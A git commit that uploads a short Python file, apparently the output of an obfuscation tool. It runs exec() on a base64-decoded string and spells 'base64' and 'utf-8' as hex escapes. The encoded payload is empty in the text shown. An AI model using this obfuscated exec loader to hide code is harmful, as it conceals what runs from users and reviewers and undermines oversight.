47b93eb789b7a941f3c5be83ff4ab653f897e0b6
kazi samir <97796921+kazisamir4@users.noreply.github.com>
2022-07-17 10:33:17 +0600

    Add files via upload

---
+++ samir111.py
@@ -0,0 +1,6 @@
+# Encrypted by JIBON-JR
+# Github- Ajijul123aa
+
+ssssssssssssssssssssssssssssssssssssssssssssssssss = ""
+ssssssssssssssssssssssssssssssssssssssssssssssssss += ""
+exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(ssssssssssssssssssssssssssssssssssssssssssssssssss.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
